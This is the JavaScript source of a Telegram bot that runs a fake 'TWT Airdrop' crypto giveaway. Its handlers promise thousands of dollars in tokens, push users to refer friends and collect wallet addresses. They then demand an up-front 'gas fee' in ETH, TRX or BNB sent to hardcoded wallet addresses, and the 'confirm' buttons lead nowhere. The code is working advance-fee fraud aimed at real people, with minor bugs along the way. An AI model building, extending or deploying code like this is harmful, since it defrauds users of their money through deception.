const client = require("./redisConfig");
const fs = require('fs');



 function startFuntion(chat){
                     
        let caption;
        let keyboard;
        let keyboardJSON;
        const formData = new FormData();

        keyboard = [
            [{ text: 'Join Airdrop', callback_data: '/JoinGroup' }]
          ]

        keyboardJSON = JSON.stringify({ 'inline_keyboard': keyboard });

        

        caption = "Hello "+`${chat?.first_name}`+", I am your friendly TWT  Airdrop bot\n"+
        "\n"+
        "🔹 Earn 9,000 TWT (~$11,970) For Completing Tasks\n"+
        "🔹 Earn 100 TWT (~$133) For Each Refer\n"+
        "\n"+
        "📢 Airdrop Rules\n"+
        "\n"+
        "🔸 follow Our Twitter handle\n"+
        "🔹 follow Our Instagram handle\n"+
        "🔸 Join Our Telegram Group\n"+
        "🔹 Join Our Telegram Channel\n";
        "🔸 Refer at least 5 Friends\n"+
        "\n"+
        "Click On  '✅ Join Airdrop' For Procced";
        
        formData.append('chat_id', chat?.id);
        formData.append('photo', fs.createReadStream('./download.png'));
        formData.append('caption', caption);
        formData.append('reply_markup', keyboardJSON);


        return {
          formData,
          urlType: `sendPhoto`
        }

}



 function JoinGroupFunction(chat){
   
        let caption;
        let keyboard;
        let keyboardJSON;
        const formData = new FormData();


        caption =     "Let's proceed:\n"+
                     "🔸 follow Our Twitter handle\n"+
                     "🔹 follow Our Instagram handle\n"+
                     "🔸 Join Our Telegram Group\n"+
                     "🔹 Join Our Telegram Channel\n";
      keyboard = [
      [{ text: 'check ✅', callback_data: '/submit' }]
    ]

      keyboardJSON = JSON.stringify({ 'inline_keyboard': keyboard });

        formData.append('chat_id', chat?.id);
        formData.append('photo', fs.createReadStream('./image2.jpeg'));
        formData.append('caption', caption);
        formData.append('reply_markup', keyboardJSON);

        return {
          formData,
          urlType: `sendPhoto`
        }
   
}


 function submitWallet(chat){
  
        let caption;
       
        const formData = new FormData();

            caption = "⬇️ Now Please Submit Your TWT ERC20 Wallet Address\n"+ 
            "Search 'TWT' in Trust wallet or Safepal , Copy receive address and paste it Here\n";
            formData.append('chat_id', chat?.id);
            formData.append('photo', fs.createReadStream('./image3.jpg'));
            formData.append('caption', caption);

            client.set(`${chat?.first_name}`, "/walletSubmit"); 

            return  {
            formData,
            urlType: `sendPhoto`
            }

   
}

 function submitWalletComplete(chat){


                let text;
                let keyboard;
                let keyboardJSON;
                const formData = new FormData();

                keyboard = [
                [{ text: 'Withdraw Token', callback_data: '/Withdraw' }]
                ]

                keyboardJSON = JSON.stringify({ 'inline_keyboard': keyboard });

 
        text = "🎉 Congratulations"+`${chat?.first_name}`+
                  "9,000 $TWT equivalent to (~$11,970) will be send to your wallet."+
                "Share the your Referral link to others and get 100 $TWT (~$133) for Each Refer"+
                "‼️You need at least 👥 5 referrals to withdraw your Tokens."+
                "Share your Referral link: "+
                "https://t.me/tegaOnyoh_bot";
        
        
                return {
                    chat_id: chat?.id,
                    text,
                    reply_markup: keyboardJSON
                }

}

 function withdrawFunction(chat){
   
        let caption;
       
        let keyboard;
        let keyboardJSON;
        const formData = new FormData();


            caption = "Attention ❗️\n"+
                       "\n"+
                       "💎 You Need Send $27 (0.05 BNB or 230 TRX or 0.009 ETH) as Gas Fee for Withdraw your TWT Tokens.\n"+
                       "💸 This Gas fee is Needed for Transfer your TWT Tokens Because Transfer fee in Ethereum (ERC20) Network is So High.\n"+
                       "\n"+
                       "💳 Chose Payment methods From Below Buttons 👇:\n"
            
        keyboard = [
        [{ text: '🔸 BNB', callback_data: '/BNB' }],
        [{ text: '🔺 TRX', callback_data: '/TRX' }],
        [{ text: '🔹 ETH', callback_data: '/ETH' }]
        ]

        keyboardJSON = JSON.stringify({ 'inline_keyboard': keyboard });


            formData.append('chat_id', chat?.id);
            formData.append('photo', fs.createReadStream('./image4.jpeg'));
            formData.append('caption', caption);
            formData.append('reply_markup', keyboardJSON);
            
          
            return  {
            formData,
            urlType: `sendPhoto`
            }

}


 function ethGasFee(chat){
   
        const text = " 📝 Please Send 0.009 ETH as Ethereum (ERC20) network fee for withdraw your TWT Tokens.\n\n"+
                     "Address :- 0x1Eebc95ac5945C467a9c73Aa0b527137983595fE \n\n"+
                     "Send: 0.009 ETH \n\n"+
                    "➡️ After Server Receive your Transaction fee you will receive Your TWT Tokens within 10-40 Seconds.\n\n"+ 
                     "⚠️ Note: After Send Amount Must click on '✅ Confirm Transaction' button";

                     keyboard = [
                        [{ text: 'check ✅', callback_data: '' }]
                      ]
                  
                        keyboardJSON = JSON.stringify({ 'inline_keyboard': keyboard });
                
                return {
                    chat_id: chat?.id,
                    text,
                    reply_markup: keyboardJSON,
                    urlType: 'sendMessage'
                }

  
}


 function trxGasFee(chat){
   
        const text = " 📝 Please Send 230 TRX as Tron (TRC20) network fee for withdraw your TWT Tokens.\n\n"+
                     "Address :-TPFDpdFrMndJD8ZwhKC9joZ22pGyCgPzvJ \n\n"+
                     "Send: 230 TRX \n\n"+
                    "➡️ After Server Receive your Transaction fee you will receive Your TWT Tokens within 10-40 Seconds.\n\n"+ 
                     "⚠️ Note: After Send Amount Must click on '✅ Confirm Transaction' button";

                     keyboard = [
                        [{ text: 'check ✅', callback_data: '' }]
                      ]
                  
                        keyboardJSON = JSON.stringify({ 'inline_keyboard': keyboard });
                
                return {
                    chat_id: chat?.id,
                    text,
                    reply_markup: keyboardJSON,
                    urlType: 'sendMessage'
                }

   
}

 function bnbGasFee(chat){

        const text = " 📝 Please Send 0.05 BNB Smart Chain as BNB (BEP20) network fee for withdraw your TWT Tokens. \n\n"+
                     "Address :- bnb1e3tpnrmlft3eaqdrg9kalwwtq93a8p45r350a3 \n\n"+
                     "Send: 0.05 TRX \n\n"+
                    "➡️ After Server Receive your Transaction fee you will receive Your TWT Tokens within 10-40 Seconds.\n\n"+ 
                     "⚠️ Note: After Send Amount Must click on '✅ Confirm Transaction' button";

                     keyboard = [
                        [{ text: 'check ✅', callback_data: '' }]
                      ]
                  
                        keyboardJSON = JSON.stringify({ 'inline_keyboard': keyboard });
                
                return {
                    chat_id: chat?.id,
                    text,
                    reply_markup: keyboardJSON,
                    urlType: 'sendMessage'
                }
                
}


module.exports = {startFuntion, JoinGroupFunction, submitWallet, submitWalletComplete, withdrawFunction, ethGasFee, trxGasFee, bnbGasFee};